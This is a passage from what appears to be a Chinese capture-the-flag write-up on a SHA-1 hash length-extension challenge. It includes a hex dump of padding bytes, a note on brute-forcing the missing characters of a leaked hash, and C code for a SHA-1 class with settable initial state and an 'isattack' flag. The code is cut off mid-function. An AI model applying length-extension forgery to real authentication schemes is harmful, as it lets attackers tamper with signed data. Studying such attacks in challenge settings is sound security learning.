<pre><code><span class="number">00000080</span>: <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="built_in">.
</span><span class="number">00000090</span>: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="built_in">.
</span><span class="number">000000</span>A0: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="built_in">.
</span><span class="number">000000</span>B0: <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>   <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">04</span> <span class="number">00</span>  <span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="attribute">...</span><span class="built_in">.</span>
</code></pre><p>&#x5C31;&#x53EF;&#x4EE5;&#x5F97;&#x51FA;&#x4E0E;&#x7B2C;&#x4E8C;&#x7EC4;&#x76F8;&#x7B49;&#x7684;sha1&#xFF0C;&#x5373;f687bedf0ce1e96f9238c7dae716337b0d9d74ad</p>
<p>&#x672C;&#x9898;&#x4E2D;&#xFF0C;&#x7531;&#x4E8E;&#x83B7;&#x53D6;&#x7684;sha1&#x4E0D;&#x5168;&#xFF0C;&#x53EA;&#x9700;&#x5BF9;&#x7B2C;&#x4E00;&#x6B21;&#x83B7;&#x53D6;&#x7684;sha1&#x4E2D;&#x7684;x&#x8FDB;&#x884C;&#x7206;&#x7834;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x7B2C;&#x4E00;&#x6B21;&#x7684;sha1&#xFF0C;&#x63D0;&#x4EA4;&#x5373;&#x53EF;&#x3002;</p>
<h4 id="&#x5148;&#x7528;python&#x5199;&#x4E86;&#x4E00;&#x4E2A;&#x7206;&#x7834;&#xFF0C;&#x7ED3;&#x679C;&#x592A;&#x6162;&#x4E86;&#xFF0C;&#x6709;&#x7528;c&#x5199;&#x4E86;&#x4E00;&#x4E2A;">&#x5148;&#x7528;python&#x5199;&#x4E86;&#x4E00;&#x4E2A;&#x7206;&#x7834;&#xFF0C;&#x7ED3;&#x679C;&#x592A;&#x6162;&#x4E86;&#xFF0C;&#x6709;&#x7528;c&#x5199;&#x4E86;&#x4E00;&#x4E2A;</h4><pre><code>&amp;<span class="symbol">#x4EE3</span>;&amp;<span class="symbol">#x7801</span>;
<span class="class">Sha1</span>.h
//! <span class="class">SHA1</span> &amp;<span class="symbol">#x52A8</span>;&amp;<span class="symbol">#x6001</span>;&amp;<span class="symbol">#x94FE</span>;&amp;<span class="symbol">#x63A5</span>;&amp;<span class="symbol">#x5E93</span>;&amp;<span class="symbol">#x5B9E</span>;&amp;<span class="symbol">#x73B0</span>;   <span class="class">H</span>&amp;<span class="symbol">#x6587</span>;&amp;<span class="symbol">#x4EF6</span>;
<span class="symbol">#ifndef</span> <span class="class">SHA1_H</span>
<span class="symbol">#define</span> <span class="class">SHA1_H</span>

<span class="symbol">#include</span> &amp;quot;stdio.h&amp;quot;
//! #&amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;<span class="class">SHA</span> &amp;<span class="symbol">#x4E2D</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;<span class="class">ENUM</span>
/*&amp;<span class="symbol">#xFF01</span>;
     @see enum
*/
<span class="symbol">#ifndef</span> _SHA_enum_
<span class="symbol">#define</span> _SHA_enum_
enum
{
         shaSuccess   = <span class="number">0</span>,
         /*!   &amp;lt;&amp;<span class="symbol">#x7A7A</span>;&amp;<span class="symbol">#x6307</span>;&amp;<span class="symbol">#x793A</span>;&amp;<span class="symbol">#x53C2</span>;&amp;<span class="symbol">#x91CF</span>; */
         shaNull,           
         /*!   &amp;lt; &amp;<span class="symbol">#x8F93</span>;&amp;<span class="symbol">#x5165</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;&amp;<span class="symbol">#x592A</span>;&amp;<span class="symbol">#x957F</span>;&amp;<span class="symbol">#x63D0</span>;&amp;<span class="symbol">#x793A</span>; */
         shaInputTooLong,
          /*! &amp;lt;called <span class="class">Input</span> after <span class="class">Result</span> --&amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x8F93</span>;&amp;<span class="symbol">#x5165</span>;&amp;<span class="symbol">#x7ED3</span>;&amp;<span class="symbol">#x679C</span>;&amp;<span class="symbol">#x547D</span>;&amp;<span class="symbol">#x540D</span>;&amp;<span class="symbol">#x4E4B</span>; */
         shaStateError     
};
<span class="symbol">#endif</span>
//! <span class="class">SHA1HashSize</span>&amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x662F</span>;<span class="class">SHA1</span>&amp;<span class="symbol">#x54C8</span>;&amp;<span class="symbol">#x5E0C</span>;&amp;<span class="symbol">#x8868</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x5927</span>;&amp;<span class="symbol">#x5C0F</span>;
<span class="symbol">#define</span> <span class="class">SHA1HashSize</span> <span class="number">20</span>
//!   #&amp;<span class="symbol">#x80FD</span>;&amp;<span class="symbol">#x591F</span>;&amp;<span class="symbol">#x8FDB</span>;&amp;<span class="symbol">#x884C</span>;&amp;<span class="symbol">#x52A8</span>;&amp;<span class="symbol">#x6001</span>;&amp;<span class="symbol">#x94FE</span>;&amp;<span class="symbol">#x63A5</span>;&amp;<span class="symbol">#x5E93</span>;&amp;<span class="symbol">#x7F16</span>;&amp;<span class="symbol">#x8BD1</span>;&amp;<span class="symbol">#x7684</span>;<span class="class">SHA1</span>&amp;<span class="symbol">#x7C7B</span>;
 /*! 
       @see class _declspec(dllexport) <span class="class">SHA_1</span>
       &amp;<span class="symbol">#x5C06</span>;<span class="class">SHA1</span>&amp;<span class="symbol">#x7B97</span>;&amp;<span class="symbol">#x6CD5</span>;&amp;<span class="symbol">#x5199</span>;&amp;<span class="symbol">#x6210</span>;&amp;<span class="symbol">#x52A8</span>;&amp;<span class="symbol">#x6001</span>;&amp;<span class="symbol">#x94FE</span>;&amp;<span class="symbol">#x63A5</span>;&amp;<span class="symbol">#x5E93</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x5F62</span>;&amp;<span class="symbol">#x5F0F</span>;&amp;<span class="symbol">#x65B9</span>;&amp;<span class="symbol">#x4FBF</span>;&amp;<span class="symbol">#x8C03</span>;&amp;<span class="symbol">#x7528</span>;&amp;<span class="symbol">#xFF0C</span>;&amp;<span class="symbol">#x751F</span>;&amp;<span class="symbol">#x6210</span>;&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x4F7F</span>;&amp;<span class="symbol">#x7528</span>;
 */
class _declspec(dllexport) <span class="class">SHA_1</span>
{
<span class="method">public:</span>
         //!   #&amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;&amp;<span class="symbol">#x7ED3</span>;&amp;<span class="symbol">#x6784</span>;&amp;<span class="symbol">#x63A7</span>;&amp;<span class="symbol">#x5236</span>;&amp;<span class="symbol">#x4E0A</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x6587</span>;&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>; <span class="class">SHA1Context</span>
         /*!
             &amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x8FD9</span>;&amp;<span class="symbol">#x79CD</span>;&amp;<span class="symbol">#x7ED3</span>;&amp;<span class="symbol">#x6784</span>;&amp;<span class="symbol">#x5C06</span>;&amp;<span class="symbol">#x4F1A</span>;&amp;<span class="symbol">#x63A7</span>;&amp;<span class="symbol">#x5236</span>;&amp;<span class="symbol">#x4E0A</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x6587</span>;&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>; for   the <span class="class">SHA</span>-<span class="number">1</span>
             hashing operation
                   @see   struct <span class="class">SHA1Context</span>
         */
         typedef   struct <span class="class">SHA1Context</span>
         {
                   unsigned   long <span class="class">Intermediate_Hash</span>[<span class="class">SHA1HashSize</span>/<span class="number">4</span>]; /*! &amp;lt;<span class="class">Message</span> <span class="class">Digest</span>  */

                   unsigned   long <span class="class">Length_Low</span>;            /*!   &amp;lt;<span class="class">Message</span> length in bits      */
                   unsigned   long <span class="class">Length_High</span>;           /*!   &amp;lt;<span class="class">Message</span> length in bits      */

                   /*!   &amp;lt;<span class="class">Index</span> into message block array   */
                   long   <span class="class">Message_Block_Index</span>;
                   unsigned   char <span class="class">Message_Block</span>[<span class="number">64</span>];      /*!   &amp;lt;<span class="number">512</span>-bit message blocks      */

                   int   <span class="class">Computed</span>;               /*! &amp;lt;<span class="class">Is</span> the   digest computed?         */
                   int   <span class="class">Corrupted</span>;             /*! &amp;lt;<span class="class">Is</span> the   message digest corrupted? */
         }   <span class="class">SHA1Context</span>;

<span class="method">public:</span>
      //! <span class="symbol">#SHA_1</span> &amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6784</span>;&amp;<span class="symbol">#x9020</span>;&amp;<span class="symbol">#x51FD</span>;&amp;<span class="symbol">#x6570</span>;
      /*!
          @see <span class="class">SHA_1</span>()
      &amp;<span class="symbol">#x5176</span>;&amp;<span class="symbol">#x4E2D</span>;&amp;<span class="symbol">#x5E94</span>;&amp;<span class="symbol">#x8BE5</span>;&amp;<span class="symbol">#x5BF9</span>;<span class="class">SHA_1</span>&amp;<span class="symbol">#x7C7B</span>;&amp;<span class="symbol">#x4E2D</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x4E00</span>;&amp;<span class="symbol">#x4E9B</span>;&amp;<span class="symbol">#x53D8</span>;&amp;<span class="symbol">#x91CF</span>;&amp;<span class="symbol">#x8FDB</span>;&amp;<span class="symbol">#x884C</span>;&amp;<span class="symbol">#x76F8</span>;&amp;<span class="symbol">#x5E94</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x521D</span>;&amp;<span class="symbol">#x59CB</span>;&amp;<span class="symbol">#x5316</span>;
      */
         <span class="class">SHA_1</span>();
         //!   <span class="symbol">#SHA_1</span>&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6790</span>;&amp;<span class="symbol">#x6784</span>;&amp;<span class="symbol">#x51FD</span>;&amp;<span class="symbol">#x6570</span>;
      /*!
         @see   ~<span class="class">SHA_1</span>()
      &amp;<span class="symbol">#x91CA</span>;&amp;<span class="symbol">#x653E</span>;&amp;<span class="symbol">#x5185</span>;&amp;<span class="symbol">#x5B58</span>;
      */
         ~<span class="class">SHA_1</span>(void);

         /*----------------------------------&amp;<span class="symbol">#x51FD</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x539F</span>;&amp;<span class="symbol">#x578B</span>;----------------------------------*/
         //!   <span class="symbol">#SHA1</span>&amp;<span class="symbol">#x7B97</span>;&amp;<span class="symbol">#x6CD5</span>;&amp;<span class="symbol">#x4E2D</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;&amp;<span class="symbol">#x586B</span>;&amp;<span class="symbol">#x5145</span>;&amp;<span class="symbol">#x6A21</span>;&amp;<span class="symbol">#x5757</span>;
      /*!
           @see void <span class="class">SHA1PadMessage</span>(<span class="class">SHA1Context</span> *);
           @param[<span class="class">SHA1Context</span>*  &amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;&amp;<span class="symbol">#x586B</span>;&amp;<span class="symbol">#x5145</span>;&amp;<span class="symbol">#x4FE1</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6307</span>;&amp;<span class="symbol">#x9488</span>;
           @return[void] &amp;<span class="symbol">#x4E0D</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;&amp;<span class="symbol">#x4EFB</span>;&amp;<span class="symbol">#x4F55</span>;&amp;<span class="symbol">#x503C</span>;
      */
         void   <span class="class">SHA1PadMessage</span>(<span class="class">SHA1Context</span> *);      /*  &amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;&amp;<span class="symbol">#x586B</span>;&amp;<span class="symbol">#x5145</span>;&amp;<span class="symbol">#x4FE1</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6307</span>;&amp;<span class="symbol">#x9488</span>;  */
      //! <span class="symbol">#SHA1</span>&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x5757</span>;&amp;<span class="symbol">#x63CF</span>;&amp;<span class="symbol">#x8FF0</span>;&amp;<span class="symbol">#x51FD</span>;&amp;<span class="symbol">#x6570</span>;
      /*!
           @see void <span class="class">SHA1ProcessMessageBlock</span>(<span class="class">SHA1Context</span>   *);
           @param[<span class="class">SHA1Context</span>*  &amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;&amp;<span class="symbol">#x586B</span>;&amp;<span class="symbol">#x5145</span>;&amp;<span class="symbol">#x4FE1</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6307</span>;&amp;<span class="symbol">#x9488</span>;
           @param[in] &amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x5757</span>;&amp;<span class="symbol">#x957F</span>;&amp;<span class="symbol">#x5EA6</span>;&amp;<span class="symbol">#x4E3A</span>;&amp;<span class="symbol">#x56FA</span>;&amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E4B</span>;<span class="number">512</span>&amp;<span class="symbol">#x6BD4</span>;&amp;<span class="symbol">#x7279</span>;
           @return[void] &amp;<span class="symbol">#x4E0D</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;&amp;<span class="symbol">#x4EFB</span>;&amp;<span class="symbol">#x4F55</span>;&amp;<span class="symbol">#x503C</span>;
      */
         void   <span class="class">SHA1ProcessMessageBlock</span>(<span class="class">SHA1Context</span> *);
         //!   <span class="symbol">#SHA1</span>&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;&amp;<span class="symbol">#x521D</span>;&amp;<span class="symbol">#x59CB</span>;&amp;<span class="symbol">#x5316</span>;&amp;<span class="symbol">#x64CD</span>;&amp;<span class="symbol">#x4F5C</span>;&amp;<span class="symbol">#x51FD</span>;&amp;<span class="symbol">#x6570</span>;
      /*!
           @see int <span class="class">SHA1Reset</span>(  <span class="class">SHA1Context</span> *);
           @param[<span class="class">SHA1Context</span>*  &amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;&amp;<span class="symbol">#x586B</span>;&amp;<span class="symbol">#x5145</span>;&amp;<span class="symbol">#x4FE1</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6307</span>;&amp;<span class="symbol">#x9488</span>;
           @return[int] &amp;<span class="symbol">#x6210</span>;&amp;<span class="symbol">#x529F</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;shaNull&amp;<span class="symbol">#xFF0C</span>;&amp;<span class="symbol">#x5931</span>;&amp;<span class="symbol">#x8D25</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;shaSuccess
           @see <span class="class">SHA1</span> enum
      */
         int   <span class="class">SHA1Reset</span>(  <span class="class">SHA1Context</span> *,unsigned long   , unsigned long , unsigned long,unsigned long,unsigned long);
         //!   <span class="symbol">#SHA1</span>&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x8F93</span>;&amp;<span class="symbol">#x5165</span>;&amp;<span class="symbol">#x63CF</span>;&amp;<span class="symbol">#x8FF0</span>;&amp;<span class="symbol">#x51FD</span>;&amp;<span class="symbol">#x6570</span>;
      /*!
           @see int <span class="class">SHA1Input</span>(  <span class="class">SHA1Context</span> *, const unsigned char *,   unsigned int);
           @param[<span class="class">SHA1Context</span>*  &amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;&amp;<span class="symbol">#x586B</span>;&amp;<span class="symbol">#x5145</span>;&amp;<span class="symbol">#x4FE1</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6307</span>;&amp;<span class="symbol">#x9488</span>;
      @param[unsigned char &amp;<span class="symbol">#x63A5</span>;&amp;<span class="symbol">#x6536</span>;&amp;<span class="symbol">#x5355</span>;&amp;<span class="symbol">#x4F4D</span>;&amp;<span class="symbol">#x957F</span>;&amp;<span class="symbol">#x5EA6</span>;&amp;<span class="symbol">#x4E3A</span>;<span class="number">8</span>&amp;<span class="symbol">#x5B57</span>;&amp;<span class="symbol">#x8282</span>;&amp;<span class="symbol">#x500D</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;
           @return[enum] &amp;<span class="symbol">#x6210</span>;&amp;<span class="symbol">#x529F</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;shaNull&amp;<span class="symbol">#xFF0C</span>;&amp;<span class="symbol">#x5931</span>;&amp;<span class="symbol">#x8D25</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;shaSuccess&amp;<span class="symbol">#xFF0C</span>;&amp;<span class="symbol">#x9519</span>;&amp;<span class="symbol">#x8BEF</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;shaStateError
           @see <span class="class">SHA1</span> enum
      */
         int   <span class="class">SHA1Input</span>(  <span class="class">SHA1Context</span> *, const   unsigned char *, unsigned int);
         //!   <span class="symbol">#SHA1</span>&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x7ED3</span>;&amp;<span class="symbol">#x679C</span>;&amp;<span class="symbol">#x63CF</span>;&amp;<span class="symbol">#x8FF0</span>;&amp;<span class="symbol">#x51FD</span>;&amp;<span class="symbol">#x6570</span>;
      /*!
           @see int <span class="class">SHA1Result</span>( <span class="class">SHA1Context</span> *,   unsigned char <span class="class">Message_Digest</span>[<span class="class">SHA1HashSize</span>]);
           @param[<span class="class">SHA1Context</span>*  &amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;&amp;<span class="symbol">#x586B</span>;&amp;<span class="symbol">#x5145</span>;&amp;<span class="symbol">#x4FE1</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6307</span>;&amp;<span class="symbol">#x9488</span>;
      @param[unsigned char <span class="number">160</span>&amp;<span class="symbol">#x6BD4</span>;&amp;<span class="symbol">#x7279</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6458</span>;&amp;<span class="symbol">#x8981</span>;&amp;<span class="symbol">#x961F</span>;&amp;<span class="symbol">#x5217</span>;
           @attention &amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;&amp;<span class="symbol">#x4E00</span>;&amp;<span class="symbol">#x4E2A</span>;<span class="number">160</span>&amp;<span class="symbol">#x6BD4</span>;&amp;<span class="symbol">#x7279</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x6458</span>;&amp;<span class="symbol">#x8981</span>;&amp;<span class="symbol">#x961F</span>;&amp;<span class="symbol">#x5217</span>;
           @return[enum] &amp;<span class="symbol">#x6210</span>;&amp;<span class="symbol">#x529F</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;shaNull&amp;<span class="symbol">#xFF0C</span>;&amp;<span class="symbol">#x5931</span>;&amp;<span class="symbol">#x8D25</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;shaSuccess&amp;<span class="symbol">#xFF0C</span>;&amp;<span class="symbol">#x9519</span>;&amp;<span class="symbol">#x8BEF</span>;&amp;<span class="symbol">#x8FD4</span>;&amp;<span class="symbol">#x56DE</span>;shaStateError
           @see <span class="class">SHA1</span> enum
      */
         int   <span class="class">SHA1Result</span>( <span class="class">SHA1Context</span> *, unsigned char <span class="class">Message_Digest</span>[<span class="class">SHA1HashSize</span>]);

<span class="method">private:</span>
};

<span class="symbol">#endif</span> // <span class="class">SHA1_H</span>

<span class="class">Sha1</span>.app
// sha1.cpp : <span class="class">Defines</span> the entry   point for the console application.
//

<span class="symbol">#include</span> &amp;quot;<span class="class">SHA1</span>.h&amp;quot;
<span class="symbol">#include</span> &amp;quot;stdio.h&amp;quot;
<span class="symbol">#include</span> &amp;quot;windows.h&amp;quot;
/*&amp;<span class="symbol">#xFF01</span>;&amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x6240</span>;&amp;<span class="symbol">#x7528</span>;&amp;<span class="symbol">#x5404</span>;&amp;<span class="symbol">#x79CD</span>;&amp;<span class="symbol">#x53C2</span>;&amp;<span class="symbol">#x91CF</span>;&amp;<span class="symbol">#x540D</span>;&amp;<span class="symbol">#x79F0</span>;&amp;<span class="symbol">#x7686</span>;&amp;<span class="symbol">#x4E3A</span>;sha-<span class="number">1</span>&amp;<span class="symbol">#x5728</span>;&amp;<span class="symbol">#x51FA</span>;&amp;<span class="symbol">#x7248</span>;&amp;<span class="symbol">#x7269</span>;&amp;<span class="symbol">#x4E0A</span>;&amp;<span class="symbol">#x6240</span>;&amp;<span class="symbol">#x7528</span>;&amp;<span class="symbol">#x4E4B</span>;&amp;<span class="symbol">#x516C</span>;&amp;<span class="symbol">#x7528</span>;&amp;<span class="symbol">#x540D</span>;&amp;<span class="symbol">#x79F0</span>;  */
/*
 *  &amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x662F</span>;&amp;<span class="symbol">#x4E3A</span>; <span class="class">SHA1</span> &amp;<span class="symbol">#x5411</span>;&amp;<span class="symbol">#x5DE6</span>;&amp;<span class="symbol">#x73AF</span>;&amp;<span class="symbol">#x5F62</span>;&amp;<span class="symbol">#x79FB</span>;&amp;<span class="symbol">#x4F4D</span>;&amp;<span class="symbol">#x5B8F</span>; &amp;<span class="symbol">#x4E4B</span>;&amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E49</span>;
 */

<span class="class">BOOL</span> isattack = <span class="class">FALSE</span>;
int paddinglength = <span class="number">0</span>;

<span class="symbol">#define</span>   <span class="class">SHA1CircularShift</span>(bits,word) \
                (((word) &amp;lt;&amp;lt; (bits)) |   ((word) &amp;gt;&amp;gt; (<span class="number">32</span>-(bits))))

<span class="class">SHA_1</span>::<span class="class">SHA_1</span>()
{
}

<span class="class">SHA_1</span>::~<span class="class">SHA_1</span>(void)
{
}

/*
 *  &amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x4E3A</span>;sha-<span class="number">1</span>&amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x5757</span>;&amp;<span class="symbol">#x63CF</span>;&amp;<span class="symbol">#x8FF0</span>;&amp;<span class="symbol">#xFF1A</span>;
 *  &amp;<span class="symbol">#x6D88</span>;&amp;<span class="symbol">#x606F</span>;&amp;<span class="symbol">#x5757</span>;&amp;<span class="symbol">#x957F</span>;&amp;<span class="symbol">#x5EA6</span>;&amp;<span class="symbol">#x4E3A</span>;&amp;<span class="symbol">#x56FA</span>;&amp;<span class="symbol">#x5B9A</span>;&amp;<span class="symbol">#x4E4B</span>;<span class="number">512</span>&amp;<span class="symbol">#x6BD4</span>;&amp;<span class="symbol">#x7279</span>;
 */
void   <span class="class">SHA_1</span>::<span class="class">SHA1ProcessMessageBlock</span>(<span class="class">SHA1Context</span> *context)
{
      const unsigned long <span class="class">K</span>[] =      {       /* <span class="class">Constants</span> defined in   <span class="class">SHA</span>-<span class="number">1</span>   */
                            <span class="number">0x5A827999</span>,
                            <span class="number">0x6ED9EBA1</span>,
                            <span class="number">0x8F1BBCDC</span>,
                            <span class="number">0xCA62C1D6</span>
                            };
      int               t;                 /* &amp;<span class="symbol">#x5FAA</span>;&amp;<span class="symbol">#x73AF</span>;&amp;<span class="symbol">#x8BA1</span>;&amp;<span class="symbol">#x6570</span>; */
      unsigned long      temp;              /* &amp;<span class="symbol">#x4E34</span>;&amp;<span class="symbol">#x65F6</span>;&amp;<span class="symbol">#x7F13</span>;&amp;<span class="symbol">#x5B58</span>; */
      unsigned long      <span class="class">W</span>[<span class="number">80</span>];             /* &amp;<span class="symbol">#x5B57</span>;&amp;<span class="symbol">#x987A</span>;&amp;<span class="symbol">#x5E8F</span>;   */
      unsigned long      <span class="class">A</span>, <span class="class">B</span>, <span class="class">C</span>, <span class="class">D</span>,   <span class="class">E</span>;     /* &amp;<span class="symbol">#x8BBE</span>;&amp;<span class="symbol">#x7F6E</span>;&amp;<span class="symbol">#x7CFB</span>;&amp;<span class="symbol">#x7EDF</span>;&amp;<span class="symbol">#x78C1</span>;&amp;<span class="symbol">#x76D8</span>;&amp;<span class="symbol">#x7F13</span>;&amp;<span class="symbol">#x5B58</span>;&amp;<span class="symbol">#x5757</span>; */

      /*
     *    &amp;<span class="symbol">#x4EE5</span>;&amp;<span class="symbol">#x4E0B</span>;&amp;<span class="symbol">#x4E3A</span>;&amp;<span class="symbol">#x521D</span>;&amp;<span class="symbol">#x59CB</span>;&amp;<span class="symbol">#x5316</span>;&amp;<span class="symbol">#x5728</span>;<span class="class">W</span>&amp;<span class="symbol">#x961F</span>;&amp;<span class="symbol">#x5217</span>;&amp;<span class="symbol">#x4E2D</span>;&amp;<span class="symbol">#x7684</span>;&amp;<span class="symbol">#x5934</span>;<span class="number">16</span>&amp;<span class="symbol">#x5B57</span>;&amp;<span class="symbol">#x6570</span>;&amp;<span class="symbol">#x636E</span>;
     */
      for(t = <span class="number">0</span>; t &amp;lt; <span class="number">16</span>; t++)
      {
        <span class="class">W</span>[t] = context-&amp;gt;<span class="class">Message_Block</span>[t *   <span class="number">4</span>] &amp;lt;&amp;lt; <span class="number">24</span>;
        <span class="class">W</span>[t] |= context-&amp;gt;<span class="class">Message_Block</span>[t *   <span class="number">4</span> + <span class="number">1</span>] &amp;lt;&amp;lt; <span class="number">16</span>;
        <span class="class">W</span>[t] |= context-&amp;gt;<span class="class">Message_Block</span>[t *   <span class="number">4</span> + <span class="number">2</span>] &amp;lt;&amp;lt; <span class="number">8</span>;
        <span class="class">W</span>[t] |= context-&amp;gt;<span class="class">Message_Block</span>[t *   <span class="number">4</span> + <span class="number">3</span>];
      }

      for(t = <span class="number">16</span>; t &amp;lt; <span class="number">80</span>; t++)
      {
       <span class="class">W</span>[t] = <span class="class">SHA1CircularShift</span>(<span class="number">1</span>,<span class="class">W</span>[t-<span class="number">3</span>] ^   <span class="class">W</span>[t-<span class="number">8</span>] ^ <span class="class">W</span>[t-<span class="number">14</span>] ^ <span class="class">W</span>[t-<span class="number">16</span>]);
      }

      <span class="class">A</span> = context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">0</span>];
      <span class="class">B</span> = context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">1</span>];
      <span class="class">C</span> = context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">2</span>];
      <span class="class">D</span> = context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">3</span>];
      <span class="class">E</span> = context-&amp;gt;<span class="class">Intermediate_Hash</span>[<span class="number">4</span>];
      /* 
